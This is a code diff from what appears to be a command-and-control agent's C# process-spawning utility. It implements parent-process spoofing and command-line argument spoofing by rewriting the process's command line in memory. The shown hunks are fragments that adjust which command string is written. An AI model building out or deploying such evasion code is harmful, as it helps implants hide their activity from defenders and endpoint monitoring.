@@ -23,6 +23,7 @@ namespace Agent.Utlities
             Native.PROCESS_INFORMATION pInfo;
 
             //Spawn Process with or without PPID
+
             if (!TryCreateProcess(opts, out pInfo, out var hStdOutRead, out var hStdOutWrite))
             {
                 await messageManager.AddResponse(new ResponseResult()
@@ -87,9 +88,9 @@ namespace Agent.Utlities
                 RTL_USER_PROCESS_PARAMETERS_instance,
                 ProcessHandle);
 
-            int cmdLine_Length = 2 * opts.spoofedcommandline.Length;
-            int cmdLine_MaximumLength = 2 * opts.spoofedcommandline.Length + 2;
-            IntPtr real_command_addr = Marshal.StringToHGlobalUni(opts.spoofedcommandline);
+            int cmdLine_Length = 2 * opts.commandline.Length;
+            int cmdLine_MaximumLength = 2 * opts.commandline.Length + 2;
+            IntPtr real_command_addr = Marshal.StringToHGlobalUni(opts.commandline);
 
             Native.NTSTATUS ntstatus = new Native.NTSTATUS();
             int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.Length;
@@ -220,6 +221,7 @@ namespace Agent.Utlities
                 {
                     cmdLine = opts.spoofedcommandline;
                 }
+
                 Native.CreateProcessFlags flags;
                 if (opts.suspended)
                 {
